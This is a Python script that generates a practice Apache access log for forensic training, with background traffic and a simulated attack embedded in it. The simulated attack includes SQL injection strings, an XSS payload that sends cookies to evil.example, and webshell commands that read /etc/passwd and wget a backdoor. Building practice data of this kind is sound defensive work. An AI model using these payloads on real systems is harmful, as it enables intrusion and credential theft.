"""
AttackTrace - Attack Log Simulator
------------------------------------
Generates a realistic Apache-style access log containing normal
background traffic PLUS an embedded multi-stage attack:

    Stage 1: Reconnaissance (scanning for common pages)
    Stage 2: SQL Injection (data exfiltration from a login form)
    Stage 3: Stored XSS (injecting a script into a comment field)
    Stage 4: Malicious file upload (uploading a PHP webshell)
    Stage 5: Post-exploitation (using the webshell to run commands)

Use this to practice forensic reconstruction with forensic_analyzer.py
BEFORE you build your own DVWA/bWAPP lab and capture real logs.
Once you have real logs from your own lab, point the analyzer at
those instead -- this simulator is just a safe practice dataset.

Run:
    python3 attack_log_simulator.py
Output:
    access.log   (in the same folder)
"""

import random
from datetime import datetime, timedelta

OUTFILE = "access.log"

NORMAL_IPS = ["203.0.113.5", "198.51.100.23", "203.0.113.77", "198.51.100.9"]
ATTACKER_IP = "45.33.32.156"  # fictional, RFC5737/documentation-safe range not used on purpose here for realism

NORMAL_PATHS = [
    "/", "/index.php", "/about.php", "/products.php", "/contact.php",
    "/login.php", "/images/logo.png", "/css/style.css", "/js/main.js",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
]

ATTACKER_AGENT = "sqlmap/1.7.2#stable (http://sqlmap.org)"


def fmt_time(t):
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")


def log_line(ip, t, method, path, status, size, agent):
    return f'{ip} - - [{fmt_time(t)}] "{method} {path} HTTP/1.1" {status} {size} "-" "{agent}"'


def generate():
    lines = []
    start = datetime(2026, 9, 20, 8, 0, 0)
    t = start

    # ---- Normal background traffic ----
    for _ in range(120):
        t += timedelta(seconds=random.randint(2, 40))
        ip = random.choice(NORMAL_IPS)
        path = random.choice(NORMAL_PATHS)
        agent = random.choice(USER_AGENTS)
        lines.append(log_line(ip, t, "GET", path, 200, random.randint(200, 5000), agent))

    # ---- Stage 1: Reconnaissance ----
    t += timedelta(seconds=random.randint(30, 90))
    recon_paths = ["/admin/", "/wp-login.php", "/phpmyadmin/", "/backup.zip",
                   "/.git/config", "/config.php.bak", "/uploads/"]
    for p in recon_paths:
        t += timedelta(seconds=random.randint(1, 5))
        lines.append(log_line(ATTACKER_IP, t, "GET", p, 404, 210, ATTACKER_AGENT))

    # ---- Stage 2: SQL Injection on login form ----
    t += timedelta(seconds=random.randint(20, 60))
    sqli_payloads = [
        "/login.php?username=admin'--&password=x",
        "/login.php?username=admin' OR '1'='1&password=x",
        "/products.php?id=1 UNION SELECT username,password FROM users--",
        "/products.php?id=1 UNION SELECT null,table_name FROM information_schema.tables--",
    ]
    for p in sqli_payloads:
        t += timedelta(seconds=random.randint(3, 10))
        status = 200 if "UNION" in p else 302
        lines.append(log_line(ATTACKER_IP, t, "GET", p, status, random.randint(500, 2000), ATTACKER_AGENT))

    # ---- Stage 3: Stored XSS ----
    t += timedelta(seconds=random.randint(30, 70))
    xss_payload = "/comment.php?text=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.example%2Fc%3F%27%2Bdocument.cookie%3C%2Fscript%3E"
    lines.append(log_line(ATTACKER_IP, t, "POST", xss_payload, 200, 512, ATTACKER_AGENT))

    # A victim (normal user) later triggers the stored XSS unknowingly
    t += timedelta(seconds=random.randint(120, 300))
    victim_ip = random.choice(NORMAL_IPS)
    lines.append(log_line(victim_ip, t, "GET", "/comment.php", 200, 1800, random.choice(USER_AGENTS)))

    # ---- Stage 4: Malicious file upload (webshell) ----
    t += timedelta(seconds=random.randint(60, 150))
    lines.append(log_line(ATTACKER_IP, t, "POST", "/upload.php", 200, 350, ATTACKER_AGENT))
    t += timedelta(seconds=2)
    lines.append(log_line(ATTACKER_IP, t, "GET", "/uploads/shell.php.jpg", 200, 90, ATTACKER_AGENT))

    # ---- Stage 5: Post-exploitation via webshell ----
    t += timedelta(seconds=random.randint(5, 15))
    rce_commands = ["whoami", "id", "cat+/etc/passwd", "wget+http://evil.example/backdoor.sh"]
    for cmd in rce_commands:
        t += timedelta(seconds=random.randint(3, 8))
        path = f"/uploads/shell.php.jpg?cmd={cmd}"
        lines.append(log_line(ATTACKER_IP, t, "GET", path, 200, random.randint(50, 400), ATTACKER_AGENT))

    # ---- A little more normal traffic after, for realism ----
    for _ in range(20):
        t += timedelta(seconds=random.randint(5, 30))
        ip = random.choice(NORMAL_IPS)
        path = random.choice(NORMAL_PATHS)
        agent = random.choice(USER_AGENTS)
        lines.append(log_line(ip, t, "GET", path, 200, random.randint(200, 5000), agent))

    return lines


if __name__ == "__main__":
    lines = generate()
    with open(OUTFILE, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"Generated {len(lines)} log lines -> {OUTFILE}")
    print("Attacker IP used in this simulation:", ATTACKER_IP)
    print("(Don't peek at this too much -- try to find it yourself with the analyzer first!)")
